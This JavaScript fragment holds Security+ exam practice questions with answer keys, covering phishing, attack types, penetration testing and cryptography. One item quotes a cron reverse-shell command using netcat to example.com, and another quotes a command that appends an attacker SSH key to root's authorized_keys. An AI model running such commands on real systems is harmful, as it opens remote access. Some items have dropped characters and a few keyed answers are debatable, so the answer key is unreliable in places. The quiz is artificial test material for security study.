        "A user in your company reports that she received a call from someone claiming to be from the company technical support team. The caller stated that there was a virus spreading through the company and they needed immediate access to the employee's computer to stop it from being infected. What social-engineering principles did the caller use to try to trick the employee?",
      incorrectAnswers: [
        "Urgency and intimidation",
        "Authority and trust",
        "Intimidation and authority",
      ],
      correctAnswer: "Urgency and authority",
    },
    {
      question:
        "After running a vulnerability scan, Elaine discovers that the Windows 10 workstations in her company's warehouse are vulnerable to multiple known Windows exploits. What should she identify as the root cause in her report to management?",
      incorrectAnswers: [
        "Unsupported operating systems",
        "Improper or weak patch management for the firmware of the systems",
        "Use of unsecure protocols",
      ],
      correctAnswer:
        "Improper or weak patch management for the operating systems",
    },
    {
      question:
        "Ahmed has discovered that attackers spoofed IP addresses to cause them to resolve to a different hardware address. The manipulation has changed the tables maintained by the default gateway for the local network, causing data destined for one specific MAC address to now be routed elsewhere. What type of attack is this?",
      incorrectAnswers: ["DNS poisoning", "On-path attack", "Backdoor"],
      correctAnswer: "ARP poisoning",
    },
    {
      question:
        "What type of penetration test is being done when the tester is given extensive knowledge of the target network?",
      incorrectAnswers: ["Full disclosure", "Unknown environment", "Red team"],
      correctAnswer: "Known environment",
    },
    {
      question:
        "Your company is instituting a new security awareness program. You are responsible for educating end users on a variety of threats, including social engineering. Which of the following best defines social engineering?",
      incorrectAnswers: [
        "Illegal copying of software",
        "Gathering information from discarded manuals and printouts",
        "Phishing emails",
      ],
      correctAnswer: "Using people skills to obtain proprietary information",
    },
    {
      question:
        "Which of the following attacks can be caused by a user being unaware of their physical surroundings?",
      incorrectAnswers: ["ARP poisoning", "Phishing", "Smurf attack"],
      correctAnswer: "Shoulder surfing",
    },
    {
      question: "What are the two most common goals of invoice scams?",
      incorrectAnswers: [
        "Acquiring credentials or delivering a rootkit",
        "Receiving money or stealing cryptocurrency",
        "Acquiring credentials or delivering ransomware",
      ],
      correctAnswer: "Receiving money or acquiring credentials",
    },
    {
      question:
        "Which of the following type of testing uses an automated process of proactively identifying vulnerabilities of the computing systems present on a network?",
      incorrectAnswers: [
        "Security audit",
        "A known environment test",
        "An unknown environment test",
      ],
      correctAnswer: "Vulnerability scanning",
    },
    {
      question:
        "John has been asked to do a penetration test of a company. He has been given general information but no details about the network. What kind of test is this?",
      incorrectAnswers: ["Known environment", "Unknown environment", "Masked"],
      correctAnswer: "Partially known environment",
    },
    {
      question:
        "Under which type of attack does an attacker's system appear to be the server to the real client and appear to be the client to the real server?",
      incorrectAnswers: ["Denial-of-service", "Replay", "Eavesdropping"],
      correctAnswer: "On-path",
    },
    {
      question:
        "You are a security administrator for Acme Corporation. You have discovered malware on some of your company's machines. This malware seems to intercept calls from the web browser to libraries, and then manipulates the browser calls. What type of attack is this?",
      incorrectAnswers: [
        "On-path attack",
        "Buffer overflow",
        "Session hijacking",
      ],
      correctAnswer: "Man in the browser",
    },
    {
      question:
        "You are responsible for software testing at Acme Corporation. You want to check all software for bugs that might be used by an attacker to gain entrance into the software or your network. You have discovered a web application that would allow a user to attempt to put a 64-bit value into a 4-byte integer variable. What is this type of flaw?",
      incorrectAnswers: [
        "Memory overflow",
        "Buffer overflow",
        "Variable overflow",
      ],
      correctAnswer: "Integer overflow",
    },
    {
      question:
        "Angela has discovered an attack against some of the users of her website that leverage URL parameters and cookies to make legitimate users perform unwanted actions. What type of attack has she most likely discovered?",
      incorrectAnswers: [
        "SQL injection",
        "LDAP injection",
        "Cross-site scripting",
      ],
      correctAnswer: "Cross-site request forgery",
    },
    {
      question:
        'Nathan discovers the following code in the directory of a compromised user. What language is it using, and what will it do? echo "ssh-rsa ABBAB4KAE9sdafAK...Mq/jc5YLfnAnbFDRABMhuWzaWUp root@localhost" >> /root/.ssh/authorized_keys',
      incorrectAnswers: [
        "Python, adds an authorized SSH key",
        "Bash, connects to another system using an SSH key",
        "Python, connects to another system using an SSH key",
      ],
      correctAnswer: "Bash, adds an authorized SSH key",
    },
    {
      question:
        "Jared has discovered malware on the workstations of several users. This particular malware provides administrative privileges for the workstation to an external hacker. What best describes this malware?",
      incorrectAnswers: ["Trojan horse", "Logic bomb", "Multipartite virus"],
      correctAnswer: "Rootkit",
    },
    {
      question: "Why are memory leaks a potential security issue?",
      incorrectAnswers: [
        "They can expose sensitive data.",
        "They can allow attackers to inject code via the leak.",
        "None of the above",
      ],
      correctAnswer: "They can cause crashes",
    },
    {
      question:
        "Michelle discovers that a number of systems throughout her organization are connecting to a changing set of remote systems on TCP port 6667. What is the most likely cause of this, if she believes the traffic is not legitimate?",
      incorrectAnswers: [
        "An alternate service port for web traffic",
        "Downloads via a peer-to-peer network",
        "Remote access Trojans",
      ],
      correctAnswer: "Botnet command and control via IRC",
    },
    {
      question:
        "Susan performs a vulnerability scan of a small business network and discovers that the organization's consumer-grade wireless router has a vulnerability in its web server. What issue should she address in her findings?",
      incorrectAnswers: [
        "Default configuration issues",
        "An unsecured administrative account",
        "Weak encryption settings",
      ],
      correctAnswer: "Firmware patch management",
    },
    {
      question:
        "Where is an RFID attack most likely to occur as part of a penetration test?",
      incorrectAnswers: [
        "System authentication",
        "Web application access",
        "VPN logins",
      ],
      correctAnswer: "Access badges",
    },
    {
      question: "What type of phishing attack occurs via text messages?",
      incorrectAnswers: ["Bluejacking", "Phonejacking", "Text whaling"],
      correctAnswer: "Smishing",
    },
    {
      question:
        "Users in your company report someone has been calling their extension and claiming to be doing a survey for a large vendor. Based on the questions asked in the survey, you suspect that this is a scam to elicit information from your company's employees. What best describes this?",
      incorrectAnswers: ["Spear phishing", "War dialing", "Robocalling"],
      correctAnswer: "Vishing",
    },
    {
      question:
        "John is analyzing a recent malware infection on his company network. He discovers malware that can spread rapidly via vulnerable network services and does not require any interaction from the user. What best describes this malware?",
      incorrectAnswers: ["Virus", "Logic bomb", "Trojan horse"],
      correctAnswer: "Worm",
    },
    {
      question:
        "Your company has issued some new security directives. One of these new directives is that all documents must be shredded before being thrown out. What type of attack is this trying to prevent?",
      incorrectAnswers: ["Phishing", "Shoulder surfing", "On-path attack"],
      correctAnswer: "Dumpster diving",
    },
    {
      question:
        "Which of the following is not a common part of a cleanup process after a penetration test?",
      incorrectAnswers: [
        "Removing all executables and scripts from the compromised system",
        "Returning all system settings and application configurations to their original configurations",
        "Removing any user accounts created during the penetration test",
      ],
      correctAnswer:
        "Restoring all rootkits to their original settings on the system",
    },
    {
      question:
        "You have discovered that someone has been trying to log on to your web server. The person has tried a wide range of likely passwords. What type of attack is this?",
      incorrectAnswers: ["Rainbow table", "Birthday attack", "Spoofing"],
      correctAnswer: "Dictionary attack",
    },
    {
      question:
        "Jim discovers a physical device attached to a gas pump's credit card reader. What type of attack has he likely discovered?",
      incorrectAnswers: ["A replay attack", "A race condition", "A card cloner"],
      correctAnswer: "A skimmer",
    },
    {
      question:
        "What is the primary difference between active and passive reconnaissance?",
      incorrectAnswers: [
        "Active will be done manually, passive with tools.",
        "Active is done with black-box tests and passive with white-box tests.",
        "Active is usually done by attackers and passive by testers.",
      ],
      correctAnswer:
        "Active will actually connect to the network and could be detected; passive won't.",
    },
    {
      question: "A browser toolbar is an example of what type of malware?",
      incorrectAnswers: ["A rootkit", "A RAT", "A worm"],
      correctAnswer: "A PUP",
    },
    {
      question:
        "What term describes data that is collected from publicly available sources that can be used in an intelligence context?",
      incorrectAnswers: ["OPSEC", "IntCon", "STIX"],
      correctAnswer: "OSINT",
    },
    {
      question:
        "What type of attack targets a specific group of users by infecting one or more websites that that group is specifically known to visit frequently?",
      incorrectAnswers: [
        "A watercooler attack",
        "A phishing net attack",
        "A phish pond attack",
      ],
      correctAnswer: "A watering hole attack",
    },
    {
      question:
        "Tracy is concerned about LDAP injection attacks against her directory server. Which of the following is not a common technique to prevent LDAP injection attacks?",
      incorrectAnswers: [
        "Secure configuration of LDAP",
        "User input validation",
        "Output filtering rules",
      ],
      correctAnswer: "LDAP query parameterization",
    },
    {
      question:
        "Fred uses a Tor proxy to browse for sites as part of his threat intelligence. What term is frequently used to describe this part of the Internet?",
      incorrectAnswers: [
        "Through the looking glass",
        "The underweb",
        "Onion-space",
      ],
      correctAnswer: "The dark web",
    },
    {
      question:
        "What browser feature is used to help prevent successful URL redirection attacks?",
      incorrectAnswers: [
        "Certificate expiration tracking",
        "Disabling cookies",
        "Enabling JavaScript",
      ],
      correctAnswer: "Displaying the full real URL",
    },
    {
      question:
        "What is the most significant difference between cloud service-based and on-premises vulnerabilities?",
      incorrectAnswers: [
        "The severity of the vulnerability",
        "The time required to remediate",
        "Your responsibility for compromised data",
      ],
      correctAnswer: "Your ability to remediate it yourself",
    },
    {
      question:
        "Christina runs a vulnerability scan of a customer network and discovers that a consumer wireless router on the network returns a result reporting default login credentials. What common configuration issue has she encountered?",
      incorrectAnswers: [
        "An unpatched device",
        "An out of support device",
        "An unsecured user account",
      ],
      correctAnswer: "An unsecured administrator account",
    },
    {
      question:
        "What type of team is used to test security by using tools and techniques that an actual attacker would use?",
      incorrectAnswers: ["A blue team", "A white team", "A purple team"],
      correctAnswer: "A red team",
    },
    {
      question: "What is the key differentiator between SOAR and SIEM systems?",
      incorrectAnswers: [
        "SIEM includes threat and vulnerability management tools.",
        "SOAR includes security operations automation.",
        "SIEM includes security operations automation.",
      ],
      correctAnswer: "SOAR integrates with a wider range of applications.",
    },
    {
      question:
        "Your company has hired a penetration testing firm to test the network. For the test, you have given the company details on operating systems you use, applications you run, and network devices. What best describes this type of test?",
      incorrectAnswers: [
        "External test",
        "Unknown environment test",
        "Threat test",
      ],
      correctAnswer: "Known environment test",
    },
    {
      question:
        "What two files are commonly attacked using offline brute-force attacks?",
      incorrectAnswers: [
        "The Windows registry and the Linux /etc/passwd file",
        "The Windows SAM and the Linux /etc/passwd file",
        "The Windows registry and the Linux /etc/shadow file",
      ],
      correctAnswer: "The Windows SAM and the Linux /etc/shadow file",
    },
    {
      question: "What type of attack is an SSL stripping attack?",
      incorrectAnswers: [
        "A brute-force attack",
        "A Trojan attack",
        "A downgrade attack",
      ],
      correctAnswer: "An on-path attack",
    },
    {
      question:
        "What type of attack is the U.S. Trusted Foundry program intended to help prevent?",
      incorrectAnswers: [
        "Critical infrastructure attacks",
        "Metalwork and casting attacks",
        "Software source code attacks",
      ],
      correctAnswer: "Supply chain attacks",
    },
    {
      question:
        "Nicole wants to show the management in her organization real-time data about attacks from around the world via multiple service providers in a visual way. What type of threat intelligence tool is often used for this purpose?",
      incorrectAnswers: [
        "A pie chart",
        "A dark web tracker",
        "An OSINT repository",
      ],
      correctAnswer: "A threat map",
    },
    {
      question:
        "You have noticed that when in a crowded area, data from your cell phone is stolen. Later investigation shows a Bluetooth connection to your phone, one that you cannot explain. What describes this attack?",
      incorrectAnswers: ["Bluejacking", "Evil twin", "RAT"],
      correctAnswer: "Bluesnarfing",
    },
    {
      question:
        "The type and scope of testing, client contact details, how sensitive data will be handled, and the type and frequency of status meetings and reports are all common elements of what artifact of a penetration test?",
      incorrectAnswers: [
        "The black-box outline",
        "The white-box outline",
        "The close-out report",
      ],
      correctAnswer: "The rules of engagement",
    },
    {
      question:
        "Amanda encounters a Bash script that runs the following command crontab -e 0 * * * * nc example.com 8989 -e /bin/bash What does this command do?",
      incorrectAnswers: [
        "It checks the time every hour.",
        "It pulls data from example.com every minute.",
        "None of the above",
      ],
      correctAnswer: "It sets up a reverse shell.",
    },
    {
      question:
        "A penetration tester called a help desk staff member at the company that Charles works at and claimed to be a senior executive who needed her password changed immediately due to an important meeting they needed to conduct that would start in a few minutes. The staff member changed the executive's password to a password that the penetration tester provideWhat social engineering principle did the penetration tester leverage to accomplish this attack?",
      incorrectAnswers: ["Intimidation", "Scarcity", "Trust"],
      correctAnswer: "Urgency",
    },
    {
      question:
        "Patrick has subscribed to a commercial threat intelligence feed that is only provided to subscribers who have been vetted and who pay a monthly fee. What industry term is used to refer to this type of threat intelligence?",
      incorrectAnswers: ["OSINT", "ELINT", "Corporate threat intelligence"],
      correctAnswer: "Proprietary threat intelligence",
    },
    {
      question:
        "What threat hunting concept involves thinking like a malicious actor to help identify indicators of compromise that might otherwise be hidden?",
      incorrectAnswers: [
        "Intelligence fusion",
        "Threat feed analysis",
        "Bulletin analysis",
      ],
      correctAnswer: "Maneuver",
    },
    {
      question:
        "What type of malicious actor will typically have the least amount of resources available to them?",
      incorrectAnswers: ["Nation-states", "Hacktivists", "Organized crime"],
      correctAnswer: "Script kiddies",
    },
    {
      question:
        "A SYN flood seeks to overwhelm a system by tying up all the open sessions that it can create. What type of attack is this?",
      incorrectAnswers: [
        "A DDoS",
        "An application exploit",
        "A vulnerability exploit",
      ],
      correctAnswer: "A resource exhaustion attack",
    },
    {
      question:
        "A penetration tester calls a staff member for her target organization and introduces herself as a member of the IT support team. She asks if the staff member has encountered a problem with their system, then proceeds to ask for details about the individual, claiming she needs to verify that she is talking to the right person. What type of social engineering attack is this?",
      incorrectAnswers: [
        "A watering hole attack",
        "Prepending",
        "Shoulder surfing",
      ],
      correctAnswer: "Pretexting",
    },
    {
      question:
        "What term describes the use of airplanes or drones to gather network or other information as part of a penetration test or intelligence gathering operation?",
      incorrectAnswers: ["Droning", "Air Snarfing", "Aerial snooping"],
      correctAnswer: "War flying",
    },
    {
      question:
        "Gabby wants to protect a legacy platform with known vulnerabilities. Which of the following is not a common option for this?",
      incorrectAnswers: [
        "Disconnect it from the network.",
        "Place the device behind a dedicated firewall and restrict inbound and outbound traffic.",
        "Move the device to a protected VLAN.",
      ],
      correctAnswer: "Rely on the outdated OS to confuse attackers.",
    },
    {
      question:
        "In the United States, collaborative industry organizations that analyze and share cybersecurity threat information within their industry verticals are known by what term?",
      incorrectAnswers: ["IRTs", "Feedburners", "Vertical threat feeds"],
      correctAnswer: "ISACs",
    },
    {
      question:
        "After running nmap against a system on a network, Lucca sees that TCP port 23 is open and a service is running on it. What issue should he identify?",
      incorrectAnswers: [
        "Low ports should not be open to the Internet.",
        "SSH is an insecure protocol.",
        "Ports 1-1024 are well-known ports and must be firewalled.",
      ],
      correctAnswer: "Telnet is an insecure protocol.",
    },
    {
      question:
        "During a penetration test, Cameron gains physical access to a Windows system and uses a system repair disk to copy cmd.exe to the %systemroot%system32 directory while renaming it sethc.exe. When the system boots, he is able to log in as an unprivileged user, hit the Shift key five times, and open a command prompt with system-level access using sticky keys. What type of attack has he conducted?",
      incorrectAnswers: [
        "A Trojan attack",
        "A denial-of-service attack",
        "A swapfile attack",
      ],
      correctAnswer: "A privilege escalation attack",
    },
    {
      question:
        "Adam wants to describe threat actors using common attributes. Which of the following list is not a common attribute used to describe threat actors?",
      incorrectAnswers: [
        "Internal/external",
        "Resources or funding level",
        "Intent/motivation",
      ],
      correctAnswer: "Years of experience",
    },
    {
      question:
        "Madhuri is concerned about the security of the machine learning algorithms that her organization is deploying. Which of the following options is not a common security precaution for machine learning algorithms?",
      incorrectAnswers: [
        "Ensuring the source data is secure and of sufficient quality",
        "Requiring change control and documentation for all changes to the algorithms",
        "Ensuring a secure environment for all development, data acquisition, and storage",
      ],
      correctAnswer:
        "Requiring a third-party review of all proprietary algorithms",
    },
    {
      question:
        "Frank is part of a white team for a cybersecurity exercise. What role will he and his team have?",
      incorrectAnswers: [
        "Providing full details of the environment to the participants",
        "Providing partial details of the environment to the participants",
        "Providing defense against the attackers in the exercise",
      ],
      correctAnswer: "Performing oversight and judging of the exercise",
    },
    {
      question:
        "Susan receives $10,000 for reporting a vulnerability to a vendor who participates in a program to identify issues. What term is commonly used to describe this type of payment?",
      incorrectAnswers: ["A ransom", "A payday", "A zero-day disclosure"],
      correctAnswer: "A bug bounty",
    },
    {
      question:
        "Charles sets the permissions on the /etc directory on a Linux system to 777 using the chmod commanIf Alex later discovers this, what should he report his finding as?",
      incorrectAnswers: [
        "Improper file handling",
        "A privilege escalation attack",
        "None of the above",
      ],
      correctAnswer: "Open or weak permissions",
    },
    {
      question:
        "During a penetration test, Kathleen gathers information, including the organization's domain name, IP addresses, employee information, phone numbers, email addresses, and similar datWhat is this process typically called?",
      incorrectAnswers: ["Mapping", "Fingerprinting", "Aggregation"],
      correctAnswer: "Footprinting",
    },
    {
      question:
        "What term is used to describe mapping wireless networks while driving?",
      incorrectAnswers: ["Wi-driving", "Traffic testing", "CARINT"],
      correctAnswer: "War driving",
    },
    {
      question:
        "Fred discovers that the lighting and utility control systems for his company have been overwhelmed by traffic sent to them from hundreds of external network hosts. This has resulted in the lights and utility system management systems not receiving appropriate reporting, and the endpoint devices cannot receive commands. What type of attack is this?",
      incorrectAnswers: [
        "A SCADA overflow",
        "A network DDoS",
        "An application DDoS",
      ],
      correctAnswer: "An operational technology (OT) DDoS",
    },
    {
      question:
        "Ben runs a vulnerability scan using up-to-date definitions for a system that he knows has a vulnerability in the version of Apache that it is running. The vulnerability scan does not show that issue when he reviews the report. What has Ben encountered?",
      incorrectAnswers: [
        "A silent patch",
        "A missing vulnerability update",
        "A false positive",
      ],
      correctAnswer: "A false negative",
    },
    {
      question:
        "What type of technique is commonly used by malware creators to change the signature of malware to avoid detection by antivirus tools?",
      incorrectAnswers: [
        "Cloning",
        "Manual source code editing",
        "Changing programming languages",
      ],
      correctAnswer: "Refactoring",
    },
    {
      question:
        "What term describes a military strategy for political warfare that combines conventional warfare, irregular warfare, and cyberwarfare with fake news, social media influence strategies, diplomatic efforts, and manipulation of legal activities?",
      incorrectAnswers: [
        "Social warfare",
        "Social influence",
        "Cybersocial influence campaigns",
      ],
      correctAnswer: "Hybrid warfare",
    },
    {
      question:
        "Chris is notified that one of his staff was warned via a text message that the FBI is aware that they have accessed illegal websites. What type of issue is this?",
      incorrectAnswers: [
        "A phishing attempt",
        "Identity fraud",
        "An invoice scam",
      ],
      correctAnswer: "A hoax",
    },
    {
      question:
        "Angela reviews bulletins and advisories to determine what threats her organization is likely to face. What type of activity is this associated with?",
      incorrectAnswers: [
        "Incident response",
        "Penetration testing",
        "Vulnerability scanning",
      ],
      correctAnswer: "Threat hunting",
    },
    {
      question: "Why do attackers target passwords stored in memory?",
      incorrectAnswers: [
        "They are encrypted in memory.",
        "They are hashed in memory.",
        "They are often de-hashed for use.",
      ],
      correctAnswer: "They are often in plain text.",
    },
    {
      question:
        "The U.S. Department of Homeland Security (DHS) provides an automated indicator sharing (AIS) service that allows for the federal government and private sector organizations to share threat data in real time. The AIS service uses open source protocols and standards to exchange this information. Which of the following standards does the AIS service use?",
      incorrectAnswers: ["HTML and HTTPS", "SFTP and XML", "STIX and TRIX"],
      correctAnswer: "STIX and TAXII",
    },
    {
      question:
        "During what phase of a penetration test is information like employee names, phone number, and email addresses gathered?",
      incorrectAnswers: [
        "Exploitation",
        "Establishing persistence",
        "Lateral movement",
      ],
      correctAnswer: "Reconnaissance",
    },
    {
      question:
        "During a penetration test, Angela obtains the uniform of a well-known package delivery service and wears it into the target office. She claims to have a delivery for a C-level employee she knows is there and insists that the package must be signed for by that person. What social engineering technique has she used?",
      incorrectAnswers: ["Whaling", "A watering hole attack", "Prepending"],
      correctAnswer: "Impersonation",
    },
    {
      question:
        "Nick purchases his network devices through a gray market supplier that imports them into his region without an official relationship with the network device manufacturer. What risk should Nick identify when he assesses his supply chain risk?",
      incorrectAnswers: [
        "Lack of vendor support",
        "Lack of warranty coverage",
        "Inability to validate the source of the devices",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "Christina wants to identify indicators of attack for XML-based web applications that her organization runs. Where is she most likely to find information that can help her determine whether XML injection is occurring against her web applications?",
      incorrectAnswers: ["Syslog", "Authentication logs", "Event logs"],
      correctAnswer: "Web server logs",
    },
    {
      question:
        "What can Frank do to determine if he is suffering from a denial-of-service (DoS) attack against his cloud hosting environment?",
      incorrectAnswers: [
        "Nothing; cloud services do not provide security tools.",
        "Call the cloud service provider to have them stop the DoS attack.",
        "Call the cloud service provider's Internet service provider (ISP) and ask them to enable DoS prevention.",
      ],
      correctAnswer:
        "Review the cloud service provider's security tools and enable logging and anti-DoS tools if they exist.",
    },
    {
      question:
        "Frank is using the cloud hosting service's web publishing service rather than running his own web servers. Where will Frank need to look to review his logs to see what types of traffic his application is creating?",
      incorrectAnswers: ["Syslog", "Apache logs", "None of the above"],
      correctAnswer: "The cloud service's web logs",
    },
    {
      question:
        "If Frank were still operating in his on-site infrastructure, which of the following technologies would provide the most insight into what type of attack he was seeing?",
      incorrectAnswers: [
        "A firewall",
        "A vulnerability scanner",
        "Antimalware software",
      ],
      correctAnswer: "An IPS",
    },
    {
      question:
        "Alaina wants to ensure that the on-site system integration that a vendor that her company is working with is done in accordance with industry best practices. Which of the following is not a common method of ensuring this?",
      incorrectAnswers: [
        "Inserting security requirements into contracts",
        "Auditing configurations",
        "Coordinating with the vendor for security reviews during and after installation",
      ],
      correctAnswer: "Requiring an SOC report",
    },
    {
      question:
        "Elias has implemented an AI-based network traffic analysis tool that requires him to allow the tool to monitor his network for a period of two weeks before being put into full production. What is the most significant concern he needs to address before using the AI's baselining capabilities?",
      incorrectAnswers: [
        "The network should be isolated to prevent outbound traffic from being added to the normal traffic patterns.",
        "Traffic patterns may not match traffic throughout a longer timeframe.",
        "The AI may not understand the traffic flows in his network.",
      ],
      correctAnswer:
        "Compromised or otherwise malicious machines could be added to the baseline resulting in tainted training data.",
    },
    {
      question: "What is the typical goal intent or goal of hacktivists?",
      incorrectAnswers: [
        "Increasing their reputation",
        "Financial gain",
        "Gathering high-value data",
      ],
      correctAnswer: "Making a political statement",
    },
    {
      question:
        "Where does the information for predictive analysis for threat intelligence come from?",
      incorrectAnswers: [
        "Current security trends",
        "Large security datasets",
        "Behavior patterns",
      ],
      correctAnswer: "All of the above",
    },
    {
      question:
        "Social Security numbers and other personal information are often stolen for what purpose?",
      incorrectAnswers: ["Blackmail", "Tailgating", "Impersonation"],
      correctAnswer: "Identity fraud",
    },
    {
      question:
        "Security orchestration, automation, and response (SOAR) tools have three major components. Which of the following is not one of those components?",
      incorrectAnswers: [
        "Threat and vulnerability management",
        "Security incident response",
        "Security operations automation",
      ],
      correctAnswer: "Source code security analysis and testing",
    },
    {
      question:
        "Direct access, wireless, email, supply chain, social media, removable media, and cloud are all examples of what?",
      incorrectAnswers: [
        "Threat intelligence sources",
        "Attributes of threat actors",
        "Vulnerabilities",
      ],
      correctAnswer: "Threat vectors",
    },
    {
      question:
        "SourceForge and GitHub are both examples of what type of threat intelligence source?",
      incorrectAnswers: [
        "The dark web",
        "Automated indicator sharing sources",
        "Public information sharing centers",
      ],
      correctAnswer: "File or code repositories",
    },
    {
      question: "What is the root cause of improper input handling?",
      incorrectAnswers: [
        "Improper error handling",
        "Lack of user awareness",
        "Improper source code review",
      ],
      correctAnswer: "Trusting rather than validating data inputs",
    },
    {
      question:
        "There are seven impact categories that you need to know for the Security+ exam. Which of the following is not one of them?",
      incorrectAnswers: ["Data breaches", "Data exfiltration", "Data loss"],
      correctAnswer: "Data modification",
    },
    {
      question:
        "Which of the following research sources is typically the least timely when sourcing threat intelligence?",
      incorrectAnswers: [
        "Vulnerability feeds",
        "Local industry groups",
        "Threat feeds",
      ],
      correctAnswer: "Academic journals",
    },
    {
      question:
        "Ian runs a vulnerability scan, which notes that a service is running on TCP port 8080. What type of service is most likely running on that port?",
      incorrectAnswers: ["SSH", "RDP", "MySQL"],
      correctAnswer: "HTTP",
    },
    {
      question:
        "Carolyn runs a vulnerability scan of a network device and discovers that the device is running services on TCP ports 22 and 443. What services has she most likely discovered?",
      incorrectAnswers: [
        "Telnet and a web server",
        "FTP and a Windows fileshare",
        "SSH and a Windows fileshare",
      ],
      correctAnswer: "SSH and a web server",
    },
    {
      question:
        "Ryan needs to verify that no unnecessary ports and services are available on his systems, but he cannot run a vulnerability scanner. What is his best option?",
      incorrectAnswers: [
        "Passive network traffic capture to detect services",
        "Active network traffic capture to detect services",
        "Log review",
      ],
      correctAnswer: "A configuration review",
    },
    {
      question:
        "Why is improper error handling for web applications that results in displaying error messages considered a vulnerability that should be remediated?",
      incorrectAnswers: [
        "Errors can be used to crash the system.",
        "Many errors result in race conditions that can be exploited.",
        "Errors can change system permissions.",
      ],
      correctAnswer:
        "Many errors provide information about the host system or its configuration.",
    },
    {
      question:
        "Some users on your network use Acme Bank for their personal banking. Those users have all recently been the victim of an attack, in which they visited a fake Acme Bank website and their logins were compromiseThey all visited the bank website from your network, and all of them insist they typed in the correct URL. What is the most likely explanation for this situation?",
      incorrectAnswers: ["Trojan horse", "IP spoofing", "Clickjacking"],
      correctAnswer: "DNS poisoning",
    },
    {
      question:
        "John is a network administrator for Acme Company. He has discovered that someone has registered a domain name that is spelled just one letter different than his company's domain. The website with the misspelled URL is a phishing site. What best describes this attack?",
      incorrectAnswers: [
        "Session hijacking",
        "Cross-site request forgery",
        "Clickjacking",
      ],
      correctAnswer: "Typo squatting",
    },
  ];
  
  const sectionTwo = [
    {
      question:
        "You are responsible for network security at an e-commerce company. You want to ensure that you are using best practices for the e-commerce website your company hosts. What standard would be the best for you to review?",
      incorrectAnswers: ["NERC", "Trusted Foundry", "ISA/IEC"],
      correctAnswer: "OWASP",
    },
    {
      question:
        "Cheryl is responsible for cybersecurity at a mid-sized insurance company. She has decided to use a different vendor for network antimalware than she uses for host antimalware. Is this a recommended action, and why or why not?",
      incorrectAnswers: [
        "This is not recommended; you should use a single vendor for a particular security control.",
        "This is not recommended; this is described as vendor forking.",
        "It is neutral. This does not improve or detract from security.",
      ],
      correctAnswer:
        "This is recommended; this is described as vendor diversity.",
    },
    {
      question:
        "Scott wants to back up the contents of a network-attached storage (NAS) device used in a critical department in his company. He is concerned about how long it would take to restore the device if a significant failure happened, and he is less concerned about the ability to recover in the event of a natural disaster. Given these requirements, what type of backup should he use for the NAS?",
      incorrectAnswers: [
        "A tape-based backup with daily full backups",
        "A tape-based backup with nightly incremental backups",
        "A cloud-based backup service that uses high durability near-line storage",
      ],
      correctAnswer: "A second NAS device with a full copy of the primary NAS",
    },
    {
      question:
        "Yasmine is responding to a full datacenter outage, and after referencing the documentation for the systems in the datacenter she brings the network back up, then focuses on the storage area network (SAN), followed by the database servers. Why does her organization list systems for her to bring back online in a particular series?",
      incorrectAnswers: [
        "The power supply for the building cannot handle all the devices starting at once.",
        "The organization wants to ensure that a second outage does not occur due to failed systems.",
        "The fire suppression system may activate due to the sudden change in heat, causing significant damage to the systems.",
      ],
      correctAnswer:
        "The organization wants to ensure that systems are secure and have the resources they need by following a restoration order.",
    },
    {
      question:
        "Enrique is concerned about backup data being infected by malware. The company backs up key servers to digital storage on a backup server. Which of the following would be most effective in preventing the backup data being infected by malware?",
      incorrectAnswers: [
        "Place the backup server on a separate VLAN.",
        "Place the backup server on a different network segment.",
        "Use a honeynet.",
      ],
      correctAnswer: "Air-gap the backup server.",
    },
    {
      question: "What type of attribute is a Windows picture password?",
      incorrectAnswers: [
        "Somewhere you are",
        "Something you exhibit",
        "Someone you know",
      ],
      correctAnswer: "Something you can do",
    },
    {
      question:
        "Which of the following is not a critical characteristic of a hash function?",
      incorrectAnswers: [
        "It converts variable-length input into a fixed-length output.",
        "Multiple inputs should not hash to the same output.",
        "It should be fast to compute.",
      ],
      correctAnswer: "It must be reversible.",
    },
    {
      question:
        "Naomi wants to hire a third-party secure data destruction company. What process is most frequently used to ensure that third parties properly perform data destruction?",
      incorrectAnswers: [
        "Manual on-site inspection by federal inspectors",
        "Requiring pictures of every destroyed document or device",
        "All of the above",
      ],
      correctAnswer: "Contractual requirements and a csertification process",
    },
    {
      question:
        "Olivia wants to ensure that the code executed as part of her application is secure from tampering and that the application itself cannot be tampered with. Which of the following solutions should she use and why?",
      incorrectAnswers: [
        "Client-side validation and server-side execution to ensure client data access",
        "Server-side validation and client-side execution to prevent data tampering",
        "Client-side execution and validation, because it prevents data and application tampering",
      ],
      correctAnswer:
        "Server-side execution and validation, because it prevents data and application tampering",
    },
    {
      question:
        "Trevor wants to use an inexpensive device to build a custom embedded system that can monitor a process. Which of the following options is best suited for this if he wants to minimize expense and maximize simplicity while avoiding the potential for system or device compromise?",
      incorrectAnswers: [
        "A Raspberry Pi",
        "A custom FPGA",
        "A repurposed desktop PC",
      ],
      correctAnswer: "An Arduino",
    },
    {
      question:
        "Amanda wants to use a digital signature on an email she is sending to MariWhich key should she use to sign the email?",
      incorrectAnswers: [
        "Maria's public key",
        "Amanda's public key",
        "Maria's private key",
      ],
      correctAnswer: "Amanda's private key",
    },
    {
      question:
        "Nick wants to make an encryption key harder to crack, and he increases the key length by one bit from a 128-bit encryption key to a 129-bit encryption key as an example to explain the concept. How much more work would an attacker have to do to crack the key using brute force if no other attacks or techniques could be applied?",
      incorrectAnswers: ["One more", "129 more", "Four times as much"],
      correctAnswer: "Twice as much",
    },
    {
      question:
        "Gurvinder knows that the OpenSSL passwd file protects passwords by using 1,000 rounds of MD5 hashing to help protect password information. What is this technique called?",
      incorrectAnswers: ["Spinning the hash", "Key rotation", "Hash iteration"],
      correctAnswer: "Key stretching",
    },
    {
      question:
        "Fred wants to make it harder for an attacker to use rainbow tables to attack the hashed password values he stores. What should he add to every password before it is hashed to make it impossible for the attacker to simply use a list of common hashed passwords to reveal the passwords Fred has stored if they gain access to them?",
      incorrectAnswers: ["A cipher", "A spice", "A trapdoor"],
      correctAnswer: "A salt",
    },
    {
      question:
        "Ian wants to send an encrypted message to Michelle using public key cryptography. What key does he need to encrypt the message?",
      incorrectAnswers: ["His public key", "His private key", "Her private key"],
      correctAnswer: "Her public key",
    },
    {
      question:
        "What key advantage does an elliptical curve cryptosystem have over an RSA-based cryptosystem?",
      incorrectAnswers: [
        "It requires only a single key to encrypt and decrypt.",
        "It can run on older processors.",
        "It can be used for digital signatures as well as encryption.",
      ],
      correctAnswer:
        "It can use a smaller key length for the same resistance to being broken.",
    },
    {
      question:
